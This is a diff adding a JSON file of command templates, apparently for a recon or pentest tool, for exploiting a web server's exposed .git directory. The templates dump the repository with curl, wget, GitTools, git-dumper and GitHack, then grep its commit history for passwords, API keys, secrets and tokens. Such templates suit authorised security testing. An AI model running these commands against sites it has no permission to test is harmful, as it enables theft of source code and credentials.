@@ -1,0 +1,54 @@
+{
+  "commands": [
+    {
+      "title": "Check for exposed .git directory manually",
+      "template": "http://{domain}/.git/config",
+      "note": "If accessible, the .git directory may be downloaded and analyzed."
+    },
+    {
+      "title": "Download exposed .git directory using GitTools",
+      "template": "git clone https://github.com/internetwache/GitTools.git\ncd GitTools/Dumper\n./gitdumper.sh http://{domain}/.git/ /tmp/{domain}-git",
+      "note": "Downloads the full Git repository into a local folder."
+    },
+    {
+      "title": "Using git-dumper",
+      "template": "python3 git-dumper.py http://{domain}/.git/ /tmp/{domain}-git",
+      "note": "Another automated tool to download and reconstruct the Git repository."
+    },
+    {
+      "title": "Using GitHack",
+      "template": "git clone https://github.com/lijiejie/GitHack.git\ncd GitHack\npython3 githack.py http://{domain}/.git/",
+      "note": "Automated Git directory enumeration and extraction."
+    },
+    {
+      "title": "Retrieve Git HEAD file",
+      "template": "curl http://{domain}/.git/HEAD",
+      "note": "Useful to identify current Git branch."
+    },
+    {
+      "title": "Retrieve objects/info/packs",
+      "template": "curl http://{domain}/.git/objects/info/packs",
+      "note": "Helps in listing available pack files for extraction."
+    },
+    {
+      "title": "Manual reconstruction using wget",
+      "template": "wget -r -np -R 'index.html*' http://{domain}/.git/",
+      "note": "Recursively downloads the .git directory."
+    },
+    {
+      "title": "List commit history",
+      "template": "cd /tmp/{domain}-git && git log --oneline",
+      "note": "View commit messages and history for sensitive info (e.g., passwords, keys)."
+    },
+    {
+      "title": "Check for hardcoded credentials",
+      "template": "cd /tmp/{domain}-git && git log -p | grep -Ei 'password|api|secret|token'",
+      "note": "Search commit diffs for secrets."
+    },
+    {
+      "title": "Check .gitignore for hidden files",
+      "template": "cat /tmp/{domain}-git/.gitignore",
+      "note": "May reveal files that developers intended to hide."
+    }
+  ]
+}
